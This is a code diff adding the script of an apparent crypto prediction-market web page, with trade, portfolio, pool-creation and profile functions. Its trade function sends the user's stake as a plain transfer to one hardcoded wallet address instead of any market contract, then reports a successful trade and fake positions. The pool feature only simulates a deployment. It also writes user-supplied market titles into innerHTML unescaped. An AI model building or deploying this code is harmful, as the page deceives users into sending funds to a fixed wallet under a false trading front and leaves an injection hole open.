+  document.getElementById('modalMarketCategoryLabel').textContent = activeTargetMarketData.catLabel;
+  document.getElementById('modalMarketTitleLabel').textContent = activeTargetMarketData.title;
+  document.getElementById('tradeExecutionValueInput').value = "";
+  document.getElementById('projectedSharesDisplay').textContent = "—";
+  document.getElementById('projectedWinDisplay').textContent = "—";
+  document.getElementById('selectedDirectionDisplay').textContent = "—";
+  document.getElementById('outcomeSelectBtnYes').classList.remove('selected');
+  document.getElementById('outcomeSelectBtnNo').classList.remove('selected');
+  document.getElementById('globalTradingPanelOverlay').classList.add('open');
+}
+
+function closeTradingPanel() { document.getElementById('globalTradingPanelOverlay').classList.remove('open'); }
+
+function selectTradeDirection(chosenDirectionMatrixVector) {
+  designatedTradeDirection = chosenDirectionMatrixVector;
+  document.getElementById('outcomeSelectBtnYes').classList.toggle('selected', chosenDirectionMatrixVector === 'YES');
+  document.getElementById('outcomeSelectBtnNo').classList.toggle('selected', chosenDirectionMatrixVector === 'NO');
+  document.getElementById('selectedDirectionDisplay').textContent = chosenDirectionMatrixVector;
+  calculatePositionProjections();
+}
+
+function calculatePositionProjections() {
+  const totalValueCommittedUnits = parseFloat(document.getElementById('tradeExecutionValueInput').value) || 0;
+  if(!totalValueCommittedUnits || !designatedTradeDirection || !activeTargetMarketData) return;
+  const absoluteProbabilityDenominator = designatedTradeDirection === 'YES' ? activeTargetMarketData.yes / 100 : (100 - activeTargetMarketData.yes) / 100;
+  document.getElementById('projectedSharesDisplay').textContent = (totalValueCommittedUnits / absoluteProbabilityDenominator).toFixed(2) + " Units";
+  document.getElementById('projectedWinDisplay').textContent = (totalValueCommittedUnits / absoluteProbabilityDenominator).toFixed(2) + " USDC Standard";
+}
+
+async function commitTradeToBlockchain() {
+  if (!designatedTradeDirection) { alert("Select Execution Vector direction."); return; }
+  const inputAssetQuantityUnits = parseFloat(document.getElementById('tradeExecutionValueInput').value);
+  if (!inputAssetQuantityUnits || inputAssetQuantityUnits <= 0) { alert("Declare a positive size parameter."); return; }
+  
+  const executionConfirmationBtn = document.getElementById('tradeFinalExecutionBtn');
+  executionConfirmationBtn.disabled = true;
+  executionConfirmationBtn.textContent = "⏳ Signing Native Transfer Routing Asset...";
+  
+  try {
+    const destinationTargetNode = "0x1697543017e51eBe2c40A52B483ef3726E467DF5"; 
+    // Fixed: Match 18 decimals defined in addEthereumChain config to prevent RPC value errors
+    const calculatedWeiValueHex = ethers.utils.parseUnits(inputAssetQuantityUnits.toString(), 18).toHexString(); 
+    
+    const structuredTxPayloadMap = {
+      from: currentUserEVMAddress,
+      to: destinationTargetNode,
+      value: calculatedWeiValueHex, 
+      gasLimit: ethers.utils.hexlify(30000)
+    };
+    
+    const txResponse = await currentConnectedSigner.sendTransaction(structuredTxPayloadMap);
+    const structuralTxResponseHash = txResponse.hash;
+    
+    appendExecutedTradePositionToPortfolioList(activeTargetMarketData.title, designatedTradeDirection, inputAssetQuantityUnits, structuralTxResponseHash);
+    closeTradingPanel();
+    displayFeedbackToast("Asset Block Registered", "Tx finalized successfully without contract drops.", "success");
+  } catch (err) {
+    console.error(err);
+    displayFeedbackToast("Signature Rejected", "Handshake failed or RPC dropped transaction.", "error");
+  } finally {
+    executionConfirmationBtn.disabled = false;
+    executionConfirmationBtn.textContent = "⚡ SIGN & EXECUTE ON CHAIN";
+  }
+}
+
+function appendExecutedTradePositionToPortfolioList(marketTitleString, executionVectorMode, assetCommitmentSizeUnits, uniqueBroadcastHashId) {
+  const layoutTableBodyElement = document.getElementById('portfolioPositionsTableBody');
+  if(!layoutTableBodyElement) return;
+  if (layoutTableBodyElement.querySelector('td[colspan]')) layoutTableBodyElement.innerHTML = "";
+  
+  const evaluatedTargetMarketReferenceIndex = verified2026Markets.find(m => m.title === marketTitleString);
+  const derivedProbabilityWeightValue = executionVectorMode === 'YES' ? evaluatedTargetMarketReferenceIndex.yes / 100 : (100 - evaluatedTargetMarketReferenceIndex.yes) / 100;
+  
+  layoutTableBodyElement.innerHTML += `
+    <tr>
+      <td style="max-width:260px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${marketTitleString}</td>
+      <td class="pos-${executionVectorMode.toLowerCase()}">${executionVectorMode}</td>
+      <td> ${(assetCommitmentSizeUnits / derivedProbabilityWeightValue).toFixed(2)} Shares</td>
+      <td>${assetCommitmentSizeUnits.toFixed(2)} USDC</td>
+      <td class="pos-yes">+0.00 USDC</td>
+      <td style="font-size:11px; font-family:monospace; opacity:0.75;">${uniqueBroadcastHashId.slice(0,10)}...</td>
+    </tr>
+  `;
+}
+
+async function processPoolDeployment() {
+  const explicitDeclaredTitle = document.getElementById('poolTitleInput').value;
+  if(!explicitDeclaredTitle) { alert("Pool parameter title mandatory."); return; }
+  if(!currentUserEVMAddress) { initiateWalletConnect(); return; }
+  
+  const actionTriggerBtn = document.getElementById('poolDeploySubmitBtn');
+  actionTriggerBtn.disabled = true;
+  actionTriggerBtn.textContent = "⏳ Transmitting Initial Node Liquidity Setup Asset...";
+  
+  try {
+    const txResponse = await currentConnectedSigner.sendTransaction({
+      from: currentUserEVMAddress,
+      to: currentUserEVMAddress,
+      value: ethers.utils.parseUnits("0.001", 18).toHexString(), // Fixed decimal consistency
+      gasLimit: ethers.utils.hexlify(30000)
+    });
+    
+    const syntheticTargetCategoryValue = document.getElementById('poolCategorySelect').value;
+    const initialEvaluatedYesWeightValue = parseInt(document.getElementById('initialYesWeight').value) || 50;
+    
+    verified2026Markets.push({
+      id: verified2026Markets.length + 1,
+      cat: syntheticTargetCategoryValue,
+      catLabel: "🪙 " + syntheticTargetCategoryValue.toUpperCase(),
+      title: explicitDeclaredTitle,
+      yes: initialEvaluatedYesWeightValue,
+      vol: "0.00",
+      expiry: document.getElementById('poolExpiryDate').value || '2026-12-31'
+    });
+    
+    renderMarketGridCards(activeFilterScope);
+    document.getElementById('statPoolCount').textContent = verified2026Markets.length + " Live";
+    displayFeedbackToast("Matrix Operational", "Pool configuration broadcast successfully.", "success");
+    document.getElementById('poolTitleInput').value = "";
+    switchMainTab('markets');
+  } catch (err) {
+    displayFeedbackToast("Deployment Aborted", "Signature drop protocol triggered.", "error");
+  } finally {
+    actionTriggerBtn.disabled = false;
+    actionTriggerBtn.textContent = "⚡ Sign & Broadcast Contract Deployment";
+  }
+}
+
+function triggerUsernameEditing() {
+  const textDisplayNode = document.getElementById('usernameDisplayString');
+  const alternateUserInputStringFieldValue = prompt("Modify User Profile Matrix Descriptor Node:", textDisplayNode.textContent);
+  if (alternateUserInputStringFieldValue && alternateUserInputStringFieldValue.trim() !== "") {
+    textDisplayNode.textContent = alternateUserInputStringFieldValue.trim();
+    try { localStorage.setItem('__arc_user_node_name_string', alternateUserInputStringFieldValue.trim()); } catch(e){}
+  }
+}
+
+function handleProfileImageUpload(fileInputNodeReference) {
+  const targetImageFileObject = fileInputNodeReference.files[0];
+  if(!targetImageFileObject) return;
+  const sequentialFileReaderModuleInstance = new FileReader();
+  sequentialFileReaderModuleInstance.onload = function(eventObjectProgressEvent) {
+    document.getElementById('userDisplayAvatar').src = eventObjectProgressEvent.target.result;
+    try { localStorage.setItem('__arc_user_node_avatar_blob', eventObjectProgressEvent.target.result); } catch(e){}
+  };
+  sequentialFileReaderModuleInstance.readAsDataURL(targetImageFileObject);
+}
+
+function loadUserProfileNodeData() {
+  try {
+    const name = localStorage.getItem('__arc_user_node_name_string');
+    if(name) document.getElementById('usernameDisplayString').textContent = name;
+    const avatar = localStorage.getItem('__arc_user_node_avatar_blob');
+    if(avatar) document.getElementById('userDisplayAvatar').src = avatar;
+  } catch(e){}
+}
+
+function displayFeedbackToast(toastHeaderStringText, messagePayloadPayloadText, architecturalTypeClassifierClass = 'success') {
+  const toastNodeDomContainer = document.getElementById('blockchainInteractionToast');
+  document.getElementById('toastTitleHeader').textContent = toastHeaderStringText;
+  document.getElementById('toastDescriptionPayload').textContent = messagePayloadPayloadText;
+  
+  if (architecturalTypeClassifierClass === 'error') {
+    toastNodeDomContainer.style.borderColor = "var(--arc-red)";
+    toastNodeDomContainer.style.color = "var(--arc-red)";
+    document.getElementById('toastIconSymbol').textContent = "⚠️";
+  } else {
+    toastNodeDomContainer.style.borderColor = "var(--arc-accent)";
+    toastNodeDomContainer.style.color = "#fff";
+    document.getElementById('toastIconSymbol').textContent = "✅";
+  }
+  toastNodeDomContainer.classList.add('show');
+  setTimeout(() => { toastNodeDomContainer.classList.remove('show'); }, 6000);
+}
+</script>
+</body>
+</html>
